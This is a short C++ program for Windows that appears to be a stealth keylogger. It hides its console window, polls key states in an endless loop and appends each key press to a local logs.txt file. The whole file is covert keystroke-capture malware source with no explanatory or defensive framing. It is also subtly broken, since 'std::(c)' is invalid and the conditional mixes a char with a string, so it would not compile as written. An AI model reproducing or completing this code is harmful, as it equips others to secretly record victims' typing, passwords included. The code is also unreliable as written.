#include <windows.h>
#include <fstream>
#include <unordered_map>

int main() {
    std::unordered_map<char, bool> pressed;
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    while (true) {
        Sleep(50);
        for (char c = 8; c <= 190; c++) {
            bool isPressed = GetAsyncKeyState(c) & 0x8000;
            if (isPressed && !pressed[c]) {
                pressed[c] = true;
                std::ofstream("logs.txt", std::ios::app) << (c >= 32 && c <= 126 ? c : "[ASCII:" + std::(c) + "]");
            }
            if (!isPressed) pressed[c] = false;
        }
    }
    return 0;
}
